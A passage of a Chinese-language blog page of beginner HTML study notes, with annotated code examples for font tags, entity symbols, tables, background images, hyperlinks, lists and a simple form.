class="comment">&lt;!--字体标签--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span> <span class="attr">size</span>=<span class="string">&quot;59&quot;</span>&gt;</span>字体标签<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://postimg.cc/14zzHy98"><img src="https://i.postimg.cc/VsqbzNpW/2.png" alt="2.png"></a></p><h2 id="实体符号"><a href="#实体符号" class="headerlink" title="实体符号"></a>实体符号</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>实体符号<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--大于号和小于号可能和标签有冲突--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--b&lt;a&gt;c，而&lt;a&gt;s是链接--&gt;</span></span><br><span class="line">b<span class="symbol">&amp;lt;</span>a<span class="symbol">&amp;gt;</span>c<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--实体符号特点是：以&amp;开始，以;结束。&amp;lt;小于号,&amp;gt;大于号--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--加空格--&gt;</span></span><br><span class="line">avc    def<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">avc<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span>def</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://postimg.cc/hXRgHnqb"><img src="https://i.postimg.cc/HkVx8WZK/3.png" alt="3.png"></a></p><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>表格<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">borde=&quot;lpx&quot;设置表格的边框为1像素宽度。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="comment">&lt;!--让表格往下走--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>列表<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--表格先行(tr)后列(td)--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span> <span class="attr">border</span>=<span class="string">&quot;1px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;50%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;150px&quot;</span>&gt;</span><span class="comment">&lt;!--百分比设置可缩放--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--第一行--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--align对齐方式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--三列--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>a<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>b<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>c<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--第二行--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>d<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span>e<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>f<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--第三行--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>x<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>y<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>z<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--单元格合并,以及th标签--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--注意事项</span></span><br><span class="line"><span class="comment">1、row合并的时候，删除下面的单元格</span></span><br><span class="line"><span class="comment">2、col合并的时候,对删除哪一个没有要求</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;50%&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--也是单元格标签，比&lt;td&gt;多的是居中加粗--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>员工编号<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>员工薪资<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>部门名称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>a<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>b<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>c<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>d<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>e<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>f<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>g<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">&lt;td&gt;h&lt;/td&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">&lt;td&gt;i&lt;/td&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--thead、tbody、tfoot 在table中不是必须的，但便于后期的js代码编写--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span> <span class="attr">border</span>=<span class="string">&quot;1px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;50%&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">thead</span>&gt;</span> <span class="comment">&lt;!--头--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>员工编号<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>员工薪资<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>部门名称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>ex1<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>ex1<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tbody</span>&gt;</span><span class="comment">&lt;!--体--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>a<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>b<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>c<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>ex2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span><span class="comment">&lt;!--底--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tfoot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>d<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>e<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>f<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>ex3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>ex3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tfoot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://postimg.cc/z3LrvvzF"><img src="https://i.postimg.cc/qBwMm6WS/4.png" alt="4.png"></a></p><h2 id="背景色背景图和图片"><a href="#背景色背景图和图片" class="headerlink" title="背景色背景图和图片"></a>背景色背景图和图片</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span> <span class="comment">&lt;!--告诉浏览器以什么字符集打开当前页面</span></span><br><span class="line"><span class="comment">并不是设置当前页面的字符编码方式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>背景颜色和背景图片<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">&quot;red&quot;</span> <span class="attr">background</span>=<span class="string">&quot;E:\壁纸\测试.png&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--背景色位于背景图片下层--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;E:\壁纸\b.png&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100px&quot;</span> <span class="attr">title</span>=<span class="string">&quot;帕瓦&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;图片找不到了！&quot;</span> /&gt;</span><span class="comment">&lt;!--写成&lt;img src=&quot;..&quot; &gt;&lt;/img&gt;也可以&gt;</span></span><br><span class="line"><span class="comment">只设置宽度是高度会随着变(等比例)，只设置高度可能不管用</span></span><br><span class="line"><span class="comment">img标签就是图片标签</span></span><br><span class="line"><span class="comment">src属性是图片的路劲</span></span><br><span class="line"><span class="comment">title设置的时鼠标悬停时显示的信息</span></span><br><span class="line"><span class="comment">alt是用来设置图片加载失败时显示的信息</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/04/RVIahqstznSy4uJ.png" alt="1.png"></p><h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>超链接，热链接<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://youzipii.github.io&quot;</span>&gt;</span>博客<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="comment">&lt;!--文字超链接--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">href:hot references 热引用</span></span><br><span class="line"><span class="comment">href后面一定是一个资源的地址</span></span><br><span class="line"><span class="comment">也可以是本地的一个路径</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;file:///C:/Users/yxz/Desktop/%E8%83%8C%E6%99%AF%E9%A2%9C%E8%89%B2%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87.html&quot;</span>&gt;</span>超链接 <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--超链接的特点</span></span><br><span class="line"><span class="comment">下划线</span></span><br><span class="line"><span class="comment">鼠标停留时会显示小手</span></span><br><span class="line"><span class="comment">点击超链接后能跳转页面</span></span><br><span class="line"><span class="comment">中间不一定要是文字，图片也可以</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://youzipii.github.io/&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;E:\壁纸\b.png&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100px&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="comment">&lt;!--图片超链接--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://youzipii.github.io&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>博客<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--_blank是在新标签页中打开如果是self则是在本标签中打开</span></span><br><span class="line"><span class="comment">_self当前窗口</span></span><br><span class="line"><span class="comment">_top顶级窗口</span></span><br><span class="line"><span class="comment">_parents父窗口</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--超链接的作用</span></span><br><span class="line"><span class="comment">通过超链接可以从浏览器向服务器发送请求</span></span><br><span class="line"><span class="comment">浏览器向服务器发送数据(请求：request)</span></span><br><span class="line"><span class="comment">服务器向浏览器发送数据(响应:reponse)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">B/S 结构的系统：每一个请求都会对应一个响应</span></span><br><span class="line"><span class="comment">B——请求——》S</span></span><br><span class="line"><span class="comment">S——响应——》B</span></span><br><span class="line"><span class="comment">用户点击超链接和直接书入URL有什么区别?</span></span><br><span class="line"><span class="comment">本质上没有，但超链接更方便</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--有序列表--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span>=<span class="string">&quot;a&quot;</span>&gt;</span> <span class="comment">&lt;!-- 1 数字 A 大写字母 a 小写字母 i 希腊字母--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>水果</span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>apple1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>apple2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>apple3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>蔬菜<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>甜点<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--无序列表--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">type</span>=<span class="string">&quot;circle&quot;</span>&gt;</span><span class="comment">&lt;!--circle 圈圈 disc 方块 square点点--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>apple</span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>apple 3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>apple 2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>apple 1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>banana<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>grape<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>表单form<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1、表单有什么用？</span></span><br><span class="line"><span class="comment">收集用户信息</span></span><br><span class="line"><span class="comment">表单展现之后，用户填写表单，点击提交后提交数据给服务器</span></span><br><span class="line"><span class="comment">2、怎么画一个表单呢？</span></span><br><span class="line"><span class="comment">使用form标签</span></span><br><span class="line"><span class="comment">3、一个网页当中可以有多个表单</span></span><br><span class="line"><span class="comment">4、表单最终需要提交数据给服务器。</span></span><br><span class="line"><span class="comment">form标签有一个action属性，这个属性用来指定服务器地址</span></span><br><span class="line"><span class="comment">action属性和超链接的href属性一样，都可以向服务器发送请求（request）</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.199.177:8080/oa/save&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;注册&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;设置按钮上得文本&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--对于按钮来说value用于指定按钮的文本信息--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--传给这个机器上8080端口的软件--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--画一个提交(suibmit)按钮可以使用input输入域,type = &quot;input&quot;,此时按钮具有提交表单的能力，空着的是普通按钮，没有提交能力。--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 笔记</span></span><br><span class="line"><span class="comment">在用sublime的自动补全时，input标签补全的是type和name 而没有</span></span><br><span class="line"><span class="comment">value</span></span><br><span class="line"><span class="comment">搜索资料name指的是控件的名称,即文本框的名称，而在type 为submit时更改name并不能改变按钮上的字，得改变value得值，</span></span><br><span class="line"><span class="comment">value是指文字域得默认取值，用于定于文本框（中）得默认值</span></span><br><span class="line"><span class="comment">说明submit得默认值是提交.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">还有在自动补全时并没有补充/ 但浏览器也能识别不会报错，但写上更规范</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">超链接和表单都能向服务器发送请求，但表单可以携带数据</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">按钮要放到表单标签内部才能有作用</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span 